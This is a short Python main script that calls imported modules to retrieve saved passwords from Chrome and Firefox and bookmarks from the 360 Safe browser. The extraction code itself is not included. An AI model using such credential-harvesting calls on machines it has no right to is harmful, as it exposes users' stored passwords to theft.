import Chrome
import Firefox
import _360Safe


def main():
    
    Chrome.GetPasswordByChromeAuto()
    Firefox.GetPasswordByFireFoxAuto()
    _360Safe.GetBookMarksBy360SafeAuto()


if __name__ == '__main__':
    main()
